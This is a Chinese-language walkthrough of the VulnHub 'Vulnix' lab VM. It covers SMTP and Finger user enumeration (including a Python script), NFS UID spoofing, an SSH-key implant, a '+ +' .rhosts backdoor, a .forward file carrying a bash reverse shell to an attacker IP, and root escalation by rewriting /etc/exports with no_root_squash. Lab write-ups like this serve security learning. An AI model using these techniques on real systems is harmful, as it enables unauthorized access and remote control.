# HackLAB: Vulnix

项目地址：https://download.vulnhub.com/hacklab/Vulnix.7z

是一个打包好的镜像文件

**注意：导入 vmx 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

![](https://pic1.imgdb.cn/item/697820a1a583b567209bd78c.png)

## 敏感信息泄露

### SMTP 用户枚举（CVE-1999-0531）

SMTP 是电子邮件传输的标准协议。它定义了一系列命令用于邮件交换

探测出该靶机支持 VRFY 命令功能

```bash
VRFY <username>
```

- **目的**：验证指定用户名/邮箱地址是否为有效用户
- **响应**：
  - `250 <username>` 或 `250 <user@domain>` - 用户存在
  - `550 5.1.1 <user>... User unknown` - 用户不存在
  - `252 2.1.5 Cannot VRFY user` - 服务器无法验证（可能是配置了保护）

```bash
# 连接到 SMTP 服务器
telnet target.com 25

# 发送 VRFY 命令测试用户
VRFY root
250 root@target.com      # 用户存在

VRFY admin
250 admin@target.com     # 用户存在

VRFY nonexistentuser
550 User unknown         # 用户不存在
```

```bash
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.202.158
```

![](https://pic1.imgdb.cn/item/697822eba583b567209bd7d5.png)

### Finger 协议用户枚举

该协议主要目的是查询系统用户信息，促进协作和联系

```bash
# 基本连接
telnet target.com 79

# 查询所有用户（很多系统不支持）
finger @target.com

# 查询特定用户
finger root@target.com
finger admin@target.com
```

返回信息可能包括

```bash
Login: root                     Name: System Administrator
Directory: /root                Shell: /bin/bash
Last login: Mon Jan 24 14:30   on tty1
Mail last read: Wed Jan 26 09:15
No Plan.
```

```python
import socket
import sys

def finger_enum(target_ip, user_list):
    print(f"[*] 正在开始对 {target_ip} 进行 Finger 用户枚举...\n")
    
    for user in user_list:
        user = user.strip()
        try:
            # 创建 socket 连接 (TCP 79)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0) # 设置超时避免挂起
            s.connect((target_ip, 79))
            
            # 发送用户名 + 换行符
            s.send(f"{user}\r\n".encode())
            
            # 接收返回数据
            response = s.recv(1024).decode('utf-8')
            
            # 逻辑判断：如果返回结果不包含 "No one logged on" 或 "Login not found"
            # 具体的关键词需要根据目标系统的反馈进行调整
            if "No one logged on" in response or "Login" in response:
                if "Directory" in response or "Shell" in response:
                    print(f"[+] 发现有效用户: {user}")
                    print(f"    详情: {response.strip()}\n")
            
            s.close()
        except Exception as e:
            pass

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 finger_scan.py <IP> <user_file>")
        sys.exit(1)

    target = sys.argv[1]
    wordlist = sys.argv[2]

    with open(wordlist, 'r') as f:
        users = f.readlines()
        
    finger_enum(target, users)
```

![](https://pic1.imgdb.cn/item/69782556a583b567209bd812.png)

## 弱口令

```
user:letmein
```

![](https://pic1.imgdb.cn/item/69785c289ca240b15f5a754f.png)

## RCE

### NFS 挂载

扫描发现靶机有 NFS 网络文件系统，先看看共享了哪些文件

![](https://pic1.imgdb.cn/item/6978263ea583b567209bd824.png)

首先，在本地建立挂载点并把对方的 `/home/vulnix` 搬过来

```bash
mkdir -p /mnt/vulnix_target
# 使用 nolock 选项防止老旧系统的锁定机制导致挂载失败
mount -t nfs 192.168.202.158:/home/vulnix /mnt/vulnix_target -o nolock
```

但是挂载后查看没有权限

![](https://pic1.imgdb.cn/item/6978270ba583b567209bd83a.png)

查看具体的权限发现在当前的 NFS 映射下，我们虽然挂载了目录，但由于本地 root 用户被映射成了远端的匿名用户，我们甚至**无法进入**这个目录

![](https://pic1.imgdb.cn/item/6978274da583b567209bd843.png)

#### UID 欺骗 + 利用 `no_root_squash` 

如果目标的 `/etc/exports` 配置了 `no_root_squash`，但你在挂载时被识别为 `nobody`，通常是因为挂载参数或 NFS 版本协商问题

我们可以尝试强制使用 **NFS version 3** 挂载，因为 v3 协议在权限校验上比 v4 更加“宽松”，且不强制要求 ID 映射守护进程

NFS 认证在旧版本中主要依赖 **UID**

如果目标目录属于远端的 `vulnix` 用户，而 `vulnix` 的 UID 是 `1001`，那么只要我在 Kali 本地创建一个 UID 也是 `1001` 的用户，我就能以属主身份读写该目录

```bash
umount /mnt/vulnix_target
mount -t nfs -o nfsvers=3,nolock 192.168.202.158:/home/vulnix /mnt/vulnix_target
```

我们成功绕过了 NFSv4 严格的 ID 映射机制

![](https://pic1.imgdb.cn/item/697828dda583b567209bd87a.png)

现在只需要在我的 Kali 机器上“变身”成 UID 2008 的用户，就能以属主身份对这个共享目录拥有**读、写、执行**的完整权限

```bash
useradd -u 2008 temp_vulnix
su temp_vulnix
```

![](https://pic1.imgdb.cn/item/69783194a583b567209bda45.png)

#### 思路一：写入 SSH 公钥

此时，我以 `pwn_user` 的身份执行操作，由于 UID 匹配，目标 NFS 服务会认为我就是原主

```bash
# 生成密钥对（在 pwn_user 权限下）
ssh-keygen -t rsa -f /tmp/id_rsa -N ""

# 此时我可以进入目录了！
cd /mnt/vulnix_target

# 创建 .ssh 目录并写入公钥
mkdir .ssh
cat /tmp/id_rsa.pub >> .ssh/authorized_keys

# 必须确保权限正确，否则 SSH 服务会出于安全拒绝连接
chmod 700 .ssh
chmod 600 .ssh/authorized_keys
```

#### 思路二：利用 `.rhosts` 绕过认证 (513/tcp)

**rlogin** 是一个早期的 UNIX 远程登录协议（类似于 telnet），监听在 **513/tcp** 端口。它的设计基于"信任主机"模型，这在现代安全环境下被认为是**极度脆弱**的

- `.rhosts` 文件位于用户家目录 (`~/.rhosts`)
- 格式：`hostname username`
- 功能：允许来自指定主机的指定用户**无需密码**直接登录
- 示例文件内容如下

```bash
trusted.host.example.com   alice
192.168.1.100              bob
+                         +
```

最后一行 `+ +` 表示**允许任何主机上的任何用户**

修改靶机文件内容

```bash
echo "+ +" > .rhosts
chmod 600 .rhosts
rlogin -l vulnix 192.168.202.158
```

![](https://pic1.imgdb.cn/item/697832d4a583b567209bdabe.png)

#### 思路三：.forward 邮件后门

当邮件到达用户邮箱时，如果存在`.forward`文件，会按文件内容处理邮件

准备反弹 Shell 脚本

```bash
bash -i >& /dev/tcp/192.168.159.129/4444 0>&1
```

设置权限

```bash
echo 'bash -i >& /dev/tcp/192.168.159.129/4444 0>&1' > /mnt/vulnix_target/.forward
chmod 600 .forward
```

通过 SMTP 手动交互触发脚本

```bash
telnet 192.168.159.131 25
python -c 'import pty; pty.spawn("/bin/bash")'
```

## 提权

### /etc/exports

查看权限发现有个 `/etc/exports` 可以以 `sudoedit` 调用且不需要密码

![](https://pic1.imgdb.cn/item/69784e85a3d6d770e81cbc59.png)

修改文件内容

```bash
sudoedit /etc/exports

# /：将整个根目录共享出去
# no_root_squash：它告诉服务器，当远程客户端以 root 身份访问时，不要降权为 nobody，保留其 root 身份
/ *(rw,no_root_squash,async,insecure,no_subtree_check)
```

![](https://pic1.imgdb.cn/item/697851cba3d6d770e81cbd0a.png)

最后强制服务生效的命令没用

```
exportfs -a
```

只能重启靶机了，重新挂载以 root 身份进去

```
mkdir /mnt/root_pwn
mount -t nfs 192.168.202.158:/ /mnt/root_pwn -o nfsvers=3
```

![](https://pic1.imgdb.cn/item/697852559ca240b15f5a53a3.png)

尝试修改密码文件

![](https://pic1.imgdb.cn/item/697858559ca240b15f5a702c.png)

提权成功

![](https://pic1.imgdb.cn/item/697858419ca240b15f5a7026.png)